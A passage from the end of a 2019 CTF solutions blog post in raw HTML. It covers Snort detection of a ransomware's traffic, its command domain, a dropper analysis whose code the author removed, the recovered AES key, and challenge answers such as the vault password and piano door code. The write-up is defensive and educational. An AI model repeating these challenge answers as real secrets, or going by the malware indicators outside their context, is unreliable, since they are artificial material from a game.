</code></pre></li><li>They all share the same string:<ul><li><code>77616E6E61636F6F6B69652E6D696E2E707331</code></li></ul></li></ol><p>Create Snort rules for both sides of traffic as seen above:</p><pre tabindex=0><code>[+] Congratulation! Snort is alerting on all ransomware and only the ransomware! 
</code></pre><h2 id=92-identify-the-domain>9.2 Identify the Domain
<a class=header-link href=#92-identify-the-domain><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p><strong>The answer is <code>erohetfanu.com</code>.</strong></p><p>We have already seen the domain in Wireshark, it's <code>erohetfanu.com</code>.</p><h3 id=dropper-analysis>Dropper Analysis
<a class=header-link href=#dropper-analysis><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p><strong>Update 2022-02-07</strong>: Windows Defender keeps deleting this file because it
detects a trojan. This is likely because of this dropper code. I am tired of
reverting this. So I am gonna remove parts of this section to figure out which
part is the culprit. The cleaned up PowerShell script is on GitHub.</p><p>See the complete blog post here: <a href=https://gist.github.com/parsiya/a36311f9effc44024e8ee0d1d49962d1 target=_blank rel="noreferrer noopener">https://gist.github.com/parsiya/a36311f9effc44024e8ee0d1d49962d1</a></p><p>There's a zip file with a <code>docm</code> in it. Password is <code>elves</code>.</p><p>// removed</p><p>Looking at the PowerShell script we can see it's using AES-CBC. This gives us the file encryption key:</p><ul><li><code>FBCFC121915D99CC20A3D3D5D84F8308</code></li></ul><p>After decrypting the file, we can see it's a SQLite database file. It starts with <code>SQLite format 3</code>. Opening it gives us the password for the vault and some other places. Alabaster is an anon.</p><ul><li>The password for the vault is <code>ED#ED#EED#EF#G#F#G#ABA#BA#B</code>.</li></ul><h1 id=10-who-is-behind-it-all>10. Who Is Behind It All?
<a class=header-link href=#10-who-is-behind-it-all><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p><strong>The answer is <code>Santa</code>.</strong> He wanted us to help defend the castle so he made up the challenges. Hans was pretending to be the villain and the toy soldiers are elves in disguise.</p><blockquote><p>"Based on your victory… next year, I'm going to ask for your help in defending my whole operation from evil bad guys."</p></blockquote><p>I guess next year's challenge is mostly blue team stuff? Sounds fun.</p><p>The piano door is based on notes. We can use the PDF from challenge 8 to figure it out. It's the one that Holly sent to Alabaster. His original password does not work on the door because it has been modified based on the instructions.</p><p>We know his favorite key is <code>D</code> (from the text of Holly's email from challenge 8). We need to go from <code>E</code> to <code>D</code> which is one step or two keys to the left. So we will use the PDF to do it.</p><p>The door code is:</p><ul><li><code>D C# D C# D D C# D E F# E F# G A G# A G# A</code></li></ul><h1 id=conclusion>Conclusion
<a class=header-link href=#conclusion><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>This was fun, hope you enjoyed it as much as I did.</p></div><footer><p class=meta><span class="byline author vcard">Posted by <span class=fn>Parsia</span></span>
<time>Jan 15, 2019</time></span></p><p class=meta><a class="basic-alignment left" href=https://parsiya.net/blog/2019-01-03-cloudflare-concise-christmas-cryptography-challenges-2019-solutions/ title="Cloudflare Concise Christmas Cryptography Challenges 2019 Solutions">Cloudflare Concise Christmas Cryptography Challenges 2019 Solutions</a>
<a class="basic-alignment right" href=https://parsiya.net/blog/2019-01-19-notes-on-escaping-python-shells/ title="Notes on Escaping Python Shells">Notes on Escaping Python Shells</a></p><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//parsiya.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></footer></article></div><aside class="sidebar thirds"><section class="first odd"><h1>Who am I?</h1><p><p>I am Parsia, an application security engineer.</p><p>I write about application security, cryptography, static analysis, and
(of course) videogames.</p><p>Click on <a href=/about/>About Me!</a> to know more.</p></p></section><ul class=sidebar-nav><li class=sidebar-nav-item><a target=_blank rel="noopener noreferrer" href=https://github.com/parsiya/ title=https://github.com/parsiya/><i class="fa fa-github fa-3x"></i></a>
<a target=_blank rel="noopener noreferrer" href=https://twitter.com/cryptogangsta/ title=https://twitter.com/cryptogangsta/><i class="fa fa-twitter fa-3x"></i></a>
<a target=_blank rel="me noopener noreferrer" href=https://infosec.exchange/@parsiya title=https://infosec.exchange/@parsiya><i class="fa fa-mastodon fa-3x"></i></a>
<a target=_blank rel="noopener noreferrer" href=https://www.linkedin.com/in/parsiya title=https://www.linkedin.com/in/parsiya><i class="fa fa-linkedin fa-3x"></i></a></li></ul><section class=odd><h1>Collections</h1><li><a href=https://parsiya.net/categories/thick-client-proxying/ title="Thick Client Proxying">Thick Client Proxying</a></li><li><a href=https://parsiya.net/categories/writeup/ title=CTFs/Writeups>CTFs/Writeups</a></li><li><a href=https://parsiya.net/categories/attack-surface-analysis/ title="Attack Surface Analysis">Attack Surface Analysis</a></li><li><a href=https://parsiya.net/categories/bug-bounty/ title="Bug Bounty">Bug Bounty</a></li><li><a href=https://parsiya.net/categories/go/ title=Go/Golang>Go/Golang</a></li><li><a href=https://parsiya.net/categories/blockchain/ title=Blockchain>Blockchain</a></li><li><a href=https://parsiya.net/categories/burp-extension/ title="Burp Extension Development">Burp Extension Development</a></li><li><a href=https://parsiya.net/categories/automation/ title=Automation>Automation</a></li><li><a href=https://parsiya.net/categories/reverse-engineering/ title="Reverse Engineering">Reverse Engineering</a></li><li><a href=https://parsiya.net/categories/crypto/ title=Crypto(graphy)>Crypto(graphy)</a></li><li><a href=https://parsiya.net/categories/winappdbg/ title=WinAppDbg>WinAppDbg</a></li><li><a href=https://awsome.pw title="AWSome.pw - S3 bucket squatting - my very legit branded vulnerability">AWSome.pw - S3 bucket squatting - my very legit branded vulnerability</a></li></section></aside></div></div><footer role=contentinfo><p>Copyright &copy; 2022 Parsia - <a href=https://parsiya.net/license/>License</a> -
<span class=credit>Powered by <a target=_blank href=https://gohugo.io rel="noopener noreferrer">Hugo</a> and <a target=_blank href=https://github.com/parsiya/hugo-octopress/ rel="noopener noreferrer">Hugo-Octopress</a> theme.</p></footer></body></html>